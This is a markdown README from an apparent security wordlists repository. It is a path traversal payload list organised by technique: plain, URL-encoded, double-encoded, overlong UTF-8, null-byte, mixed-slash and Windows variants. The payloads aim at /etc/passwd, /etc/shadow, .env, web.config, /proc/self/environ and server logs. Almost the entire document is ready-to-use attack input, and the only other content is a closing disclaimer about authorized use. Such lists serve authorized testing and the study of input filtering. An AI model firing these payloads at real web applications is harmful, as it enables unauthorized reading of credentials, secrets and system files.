<div align="center">

<h2>Path Traversal Payload</h2><hr>

</div>

## 👾 Payloads

- [Basic Traversal Patterns](#basic-traversal-patterns)
- [Encoded/Double Encoded](#encodeddouble-encoded)
- [Unicode and Special Encodings](#unicode-and-special-encodings)
- [Windows Path Traversal](#windows-path-traversal)
- [URL Encoded Variations](#url-encoded-variations)
- [Double Encoding](#double-encoding)
- [Mixed Encodings](#mixed-encodings)
- [Absolute Path Bypasses](#absolute-path-bypasses)
- [Path Truncation](#path-truncation)
- [File Extension Bypasses](#file-extension-bypasses)
- [Directory Name Tricks](#directory-name-tricks)
- [Backslash Variations](#backslash-variations)
- [Mixed Slashes](#mixed-slashes)
- [URL Fragment Bypasses](#url-fragment-bypasses)
- [Case Variations](#case-variations)
- [Additional Directory Levels](#additional-directory-levels)
- [Windows Specific Files](#windows-specific-files)
- [Web Server Files](#web-server-files)
- [Configuration Files](#configuration-files)
- [Application Files](#application-files)
- [Special Characters](#special-characters)
- [UTF-8 Bypasses](#utf-8-bypasses)
- [Null Byte in Different Positions](#null-byte-in-different-positions)

### Basic Traversal Patterns

```bash
../../../etc/passwd
../../../../etc/passwd
../../../../../../etc/passwd
....//....//....//etc/passwd
..//..//..//etc/passwd
..\/..\/..\/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Encoded/Double Encoded

```bash
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
```

### Unicode and Special Encodings

```bash
..%u2215..%u2215..%u2215etc%u2215passwd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%255c..%255c..%255cetc%255cpasswd
..%5c..%5c..%5cetc%5cpasswd
```

### Windows Path Traversal

```bash
..\..\..\windows\system32\drivers\etc\hosts
....\....\....\windows\system32\drivers\etc\hosts
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
```

### URL Encoded Variations

```bash
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Double Encoding

```bash
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
```

### Mixed Encodings

```bash
..%2f..%5c..%2fetc%2fpasswd
..%c0%af..%5c..%c0%afetc%2fpasswd
..%2f..%255c..%2fetc%2fpasswd
```

### Absolute Path Bypasses

```bash
/etc/passwd
//etc//passwd
\/etc\/passwd
\\etc\\passwd
C:\windows\system32\drivers\etc\hosts
/var/www/html/index.php
```

### Path Truncation

```bash
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd\0
../../../etc/passwd\x00
../../../etc/passwd%2500
```

### File Extension Bypasses

```bash
../../../etc/passwd.jpg
../../../etc/passwd.png
../../../etc/passwd.pdf
../../../etc/passwd%00.png
../../../etc/passwd\0.png
../../../etc/passwd%20
../../../etc/passwd%0a
```

### Directory Name Tricks

```bash
..../..../..../etc/passwd
.. ..../../etc/passwd
..;/../etc/passwd
..://../etc/passwd
..:///../etc/passwd
```

### Backslash Variations

```bash
..\..\..\etc\passwd
....\....\....\etc\passwd
..\\..\\..\\etc\\passwd
..%5c..%5c..%5cetc%5cpasswd
```

### Mixed Slashes

```bash
..\../..\../etc/passwd
../..\../..\/etc/passwd
..\/..\..\/etc/passwd
```

### URL Fragment Bypasses

```bash
../../../etc/passwd#
../../../etc/passwd?
../../../etc/passwd?param=value
../../../etc/passwd#fragment
```

### Case Variations

```bash
../../../ETC/PASSWD
../../../Etc/Passwd
../../../eTc/pAsSwD
```

### Additional Directory Levels

```bash
../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
```

### Windows Specific Files

```bash
..\..\..\windows\win.ini
..\..\..\windows\system.ini
..\..\..\boot.ini
..\..\..\autoexec.bat
..\..\..\config.sys
```

### Web Server Files

```bash
../../../var/www/html/index.php
../../../var/log/apache2/access.log
../../../var/log/httpd/access_log
../../../proc/self/environ
../../../proc/version
```

### Configuration Files

```bash
../../../etc/hosts
../../../etc/shadow
../../../etc/group
../../../etc/httpd/conf/httpd.conf
../../../etc/nginx/nginx.conf
../../../etc/apache2/apache2.conf
```

### Application Files

```bash
../../../WEB-INF/web.xml
../../../web.config
../../../config.php
../../../settings.py
../../../.env
../../../.htaccess
```

### Special Characters

```bash
..%2f..%2f..%2fetc%2fpasswd%00
..%2f..%2f..%2fetc%2fpasswd%0a
..%2f..%2f..%2fetc%2fpasswd%0d%0a
..%2f..%2f..%2fetc%2fpasswd%20
```

### UTF-8 Bypasses

```bash
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
%c0%ae%c0%ae%2f%c0%ae%c0%ae%2f%c0%ae%c0%ae%2fetc%2fpasswd
```

### Null Byte in Different Positions

```bash
../../../etc/passwd%00.jpg
../../../etc/passwd\0.html
```

<h2 id="disclaimer">

## ⚠️ Disclaimer

</h2>

This repository contains materials that can potentially be used for **Security Testing**. Please ensure you have **Proper authorization** before using any of these resources against systems you don't own or have explicit permission to test. The maintainers are not responsible for any misuse of these materials.

<br>

> Ethical Use Only: These resources are intended for educational purposes, security research, and authorized testing only.

<h2 id="license">

## 📜 License

</h2>

This project is licensed under the **MIT License** - see the <a href="https://github.com/unknown-bd/Wordlists/blob/main/LICENSE">LICENSE</a> file for details.

_Maintained with ❤️ for the security community_

_Maintained by **Unknown**_

<div align="center">

<img src="https://img.shields.io/github/license/unknown-bd/Wordlists">
<img src="https://img.shields.io/github/last-commit/unknown-bd/Wordlists">
<img src="https://img.shields.io/github/contributors/unknown-bd/Wordlists">
<img src="https://img.shields.io/github/repo-size/unknown-bd/Wordlists">
<img src="https://img.shields.io/github/languages/top/unknown-bd/Wordlists">

</div>

---

<div align="center">

**If you find this repository useful, please consider giving it a star ⭐!**

</div>
